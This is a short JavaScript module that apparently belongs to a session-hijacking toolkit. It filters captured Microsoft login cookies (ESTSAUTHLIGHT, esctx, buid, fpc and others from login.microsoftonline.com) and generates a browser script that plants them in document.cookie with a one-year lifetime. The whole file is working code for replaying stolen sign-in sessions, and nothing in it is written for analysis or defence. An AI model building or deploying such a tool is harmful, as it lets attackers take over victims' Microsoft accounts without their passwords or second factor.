// Generate cookie injector script in the same format as working version
function generateCookieInjector(cookies) {
  // Filter to only essential cookies that can be set via JavaScript
  const essentialCookies = cookies.filter(cookie => {
    const essentialNames = [
      'stsservicecookie',
      'x-ms-gateway-slice', 
      'fpc',
      'buid',
      'ESTSAUTHLIGHT'
    ];
    
    // Include esctx variants but exclude HttpOnly cookies that can't be set via JS
    const isEssential = essentialNames.includes(cookie.name) || 
                       cookie.name.startsWith('esctx');
    
    // Only include cookies from Microsoft login domains
    const isMicrosoftDomain = cookie.domain.includes('login.microsoftonline.com');
    
    // Exclude HttpOnly cookies (they can't be set via document.cookie)
    const canSetViaJS = !cookie.httpOnly;
    
    return isEssential && isMicrosoftDomain && canSetViaJS;
  });

  // Generate the injector script
  const cookieArray = essentialCookies.map(cookie => ({
    domain: cookie.domain,
    httpOnly: cookie.httpOnly,
    path: cookie.path,
    secure: cookie.secure,
    expiry: cookie.expiry || 0,
    name: cookie.name,
    value: cookie.value
  }));

  const injectorScript = `(() => {
  let cookies = ${JSON.stringify(cookieArray, null, 4)};
  
  function setCookie(key, value, domain, path, isSecure) {
    const cookieMaxAge = 'Max-Age=31536000';

    if (key.startsWith('__Host')) {
      console.log('cookies Set', key, value, '!IMPORTANT _Host- prefix: Cookies with names starting with _Host- must be set with the secure flag, must be from a secure page (HTTPS), must not have a domain specified (and therefore, are not sent to subdomains), and the path must be /.');
      document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path = /;Secure;SameSite=None';
    } else if (key.startsWith('__Secure')) {
      console.log('cookies Set', key, value, '!IMPORTANT _Secure- prefix: Cookies with names starting with _Secure- (dash is part of the prefix) must be set with the secure flag from a secure page (HTTPS).');
      document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
    } else {
      if (isSecure) {
        console.log('cookies Set', key, value);
        if (window.location.hostname == domain) {
          document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + '; Secure; SameSite=None';
        } else {
          document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
        }
      } else {
        console.log('cookies Set', key, value);
        if (window.location.hostname == domain) {
          document.cookie = key + '=' + value + ';' + cookieMaxAge + ';path=' + path + ';';
        } else {
          document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';';
        }
      }
    }
  }
  
  for (let cookie of cookies) {
    if (cookie.name && cookie.value) {
      setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure);
    }
  }
})();`;

  return injectorScript;
}

module.exports = { generateCookieInjector };